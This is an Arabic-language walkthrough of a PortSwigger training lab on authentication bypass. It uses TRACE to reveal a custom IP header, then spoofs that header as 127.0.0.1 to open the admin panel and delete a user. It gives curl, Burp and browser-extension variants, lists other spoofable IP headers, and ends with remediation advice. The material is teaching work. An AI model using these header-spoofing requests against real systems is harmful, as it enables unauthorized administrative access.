# [Authentication bypass via information disclosure](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass)
# **Authentication Bypass via Information Disclosure – Write-up**

## **ملخص**

اللاب فيه ثغرة **Authentication Bypass** بسبب وجود **Custom HTTP Header** بيستخدمه الـ front-end علشان يقرر إذا كان الريكوست جاي من **localhost** ولا من مستخدم عادي.  
بعد ما اكتشفت اسم الهيدر وقدرت أعدّل قيمته، قدرت أخدع السيرفر وادخل على **Admin Panel** وأحذف المستخدم **carlos**.

---

# **خطوات الحل**

## **1) تجربة الدخول إلى /admin**

أرسلت:

```
GET /admin
```

الرد كان:

> Admin interface only available if logged in as admin or accessed from localhost.

هنا فهمت إن في **IP-based Access Control**.

---

## **2) استخدام طريقة TRACE لاكتشاف الـ Custom Header**

استخدمت:

```
TRACE /admin
```

الرد رجّع لي الريكوست زي ما السيرفر استلمه، وظهر فيه هيدر جديد:

```
X-Custom-IP-Authorization: 192.168.0.xx
```

ده هو الـ **Custom Header** اللي الموقع بيعتمد عليه.

---

## **3) تعديل قيمة الهيدر لخداع السيرفر**

غيّرت قيمة الهيدر من الـ IP الحقيقي إلى **127.0.0.1** علشان أخليه يفكر إن الريكوست جاي من الـ localhost:

```
X-Custom-IP-Authorization: 127.0.0.1
```

الريكويست بقى كده:

```
GET /admin
X-Custom-IP-Authorization: 127.0.0.1
```

النتيجة: السيرفر اعتبرني Local → فتح لي **Admin Panel**.

---

## **4) الدخول إلى Admin Panel**

بعد التعديل، زيارة:

```
/admin
```

فتحت لوحة الإدارة كاملة.

---

## **5) حذف المستخدم carlos**

أرسلت:

```
GET /admin/delete?username=carlos
```

واتمسح المستخدم.  
اللاب اتحل.

---

# **طرق أخرى لاستغلال نفس النوع**

## **1) Burp Match & Replace**

عمل Rule يحط الهيدر تلقائيًا:

- Match: (empty)
    
- Replace:
    
    ```
    X-Custom-IP-Authorization: 127.0.0.1
    ```
    

وبالتالي كل ريكوست يمر عبر Burp هيكون فيه الهيدر المزور.

---

## **2) استخدام ModHeader**

إضافة الهيدر في المتصفح:

```
X-Custom-IP-Authorization = 127.0.0.1
```

ثم زيارة /admin مباشرة.

---

## **3) باستخدام curl**

```
curl -H "X-Custom-IP-Authorization: 127.0.0.1" https://<LAB-ID>/admin
```

---

## **4) تجربة هيدرز IP تانية لو التطبيق Misconfigured**

مثال:

- X-Forwarded-For
    
- X-Real-IP
    
- X-Originating-IP
    

وتجربة قيم مثل:

- 127.0.0.1
    
- localhost
    
- ::1
    

---

# **سبب الثغرة**

التطبيق اعتمد على **Client-controlled Header** كمصدر ثقة لتحديد مصدر الريكوست، وده بيسمح لأي مستخدم إنه يقلّد localhost بسهولة.

---

# **إصلاح الثغرة**

- عدم الثقة في أي **IP-related Header** جاي من العميل.
    
- الاعتماد على IP حقيقي من السيرفر فقط.
    
- تعطيل TRACE.
    
- حماية الـ Admin Panel من خلال Firewall أو Internal Network فقط.
    

---

